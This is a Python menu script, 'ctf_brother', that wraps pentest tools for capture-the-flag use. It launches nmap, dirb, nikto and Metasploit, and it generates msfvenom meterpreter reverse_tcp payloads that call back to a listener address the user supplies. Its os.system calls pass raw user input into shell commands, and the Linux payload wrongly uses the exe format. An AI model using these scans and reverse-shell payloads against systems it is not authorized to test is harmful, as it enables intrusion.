#ctf_brother v1.0 by Mrk0pr1z

import os
import colorama
from colorama import Fore, Back, Style
from colorama import init

print(Fore.RED + 'WORK ONLY SYSTEN FOR PENTEST')

rhost = str(input(Fore.WHITE + 'Enter Ip atack target: '))
lhost = str(input(Fore.WHITE + 'Enter your Ip: '))
username = str(input(Fore.WHITE + 'Enter your computer user name for saving file: '))

print(Fore.GREEN + '1 Scanning Nmap')
print(Fore.RED + '2.Start dirb')
print(Fore.CYAN + '3.Start Metasploit Framework')
print(Fore.LIGHTGREEN_EX + '4.Install VirtualBox(root) or open VirtualBox')
print(Fore.YELLOW + '5.Make exploit msfvenom (Windows/Linux)')
print(Fore.LIGHTBLUE_EX + '6.Scaning Nikto or install nikto')


z = int(input(Fore.WHITE + 'Enter number: '))


if z == 1:
    name = str(input('Enter file name for rezultation nmap scan: '))
    os.system(f"gnome-terminal -e 'nmap -A -sT {rhost} -oX {name}.xml '")
    os.system(f'gnome-terminal -e "nano {name}.xml"')

if z == 2:
    name1 = str(input('Enter file name for rezultation dirb scan: '))
    domain1 = int(input('Your target 1.(ip:port) or 2.(domain)?:'))
    if domain1 == 1:
        port = int(input('Enter port atack server:'))
        os.system(f"gnome-terminal -e 'dirb http://{rhost}:{port}/ -o {name1}'")
        qust_r1 = int(input('Scaning complete open rezultation (1 - Yes/2 - No): '))
        if qust_r1 == 1:
            os.system(f'gnome-terminal -e "nano {name1}"')
        if qust_r1 == 2:
            print('Okay,bro')
            
    if domain1 == 2:
        domain2 = str(input('Enter domain: '))
        os.system(f"gnome-terminal -e 'dirb http://{domain2}/ -o {name1}'")
        qust_r1 = int(input('Scaning complete open rezultation (1 - Yes/2 - No): '))
        if qust_r1 == 1:
            os.system(f'gnome-terminal -e "nano {name1}"')
        if qust_r1 == 2:
            print('Okay,bro')

if z == 3:
    os.system('gnome-terminal -e "msfconsole"')

if z == 4:
    con = int(input('You have virtual box?(1 - Yes/2 - no): '))
    if con == 1:
        os.system('gnome-terminal -e "virtualbox"')
    if con == 2:
        os.system('gnome-terminal -e "apt install virtualbox"')
        os.system('gnome-terminal -e "virtualbox"')

if z == 5:
    con1 = int(input('1.Linux and 2.Windows exploit(1/2):'))
    name2 = str(input('Enter name for file msfvenom: '))
    port1 = int(input('enter local port for msfvenom: '))
    if con1 == 1:
        os.system(f'gnome-terminal -e "msfvenom -p linux/x64/meterpreter/reverse_tcp  LHOST={lhost} LPORT={port1} -f exe -a x64 -o {name2}.exe"')
        enter = str(input(f'File saving /home/{username}/{name2}.exe press enter...'))
    if con1 == 2:
        os.system(f'gnome-terminal -e "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={port1} -f exe -a x64 -o {name2}.exe"')
        enter = str(input(f'File saving /home/{username}/{name2}.exe press enter...'))

if z == 6:
    con2 = int(input('Scaning (1)domain or (2)ip?: '))
    if con2 == 1:
        name5 = str(input('enter name for filescan: '))
        domain = str(input('enter domain: '))
        os.system(f'gnome-terminal -e "nikto -h {domain} -o {name5} -Format txt "')
        enter1 = str(input(f'File saving /home/{username}/{name5} press enter...'))
        qust = int(input(Fore.LIGHTGREEN_EX + 'open filescan? (1 - yes/2 - no): '))
        if qust == 1:
            os.system(f'gnome-terminal -e "nano /home/{username}/{name5}"')
        elif qust == 2:
            print('Okay, bro')

    if con2 == 2:
        con3 = int(input('Scaning (1)ip or (2)ip + port?: '))
        if con3 == 1:
            name3 = str(input('enter name for filescan: '))
            os.system(f'gnome-terminal -e "nikto -h {rhost} -o {name3} -Format txt  "')
            enter1 = str(input(f'File saving /home/{username}/{name3} press enter...'))
            qust = int(input(Fore.LIGHTGREEN_EX + 'open filescan? (1 - yes/2 - no): '))
            if qust == 1:
                os.system(f'gnome-terminal -e "nano /home/{username}/{name3}"')
            elif qust == 2:
                print('Okay, bro')

        if con3 == 2:
            name4 = str(input('enter name for filescan: '))
            port2 = int(input('enter port: '))
            os.system(f'gnome-terminal -e "nikto -h {rhost} -p {port2} -o {name4} -Format txt "')
            enter2 = str(input(f'File saving /home/{username}/{name4} press enter...'))
            qust1 = int(input(Fore.LIGHTGREEN_EX + 'open filescan? (1 - yes/2 - no): '))
            if qust1 == 1:
                os.system(f'gnome-terminal -e "nano /home/{username}/{name4}"')
            elif qust1 == 2:
                print('Okay, bro')

init()
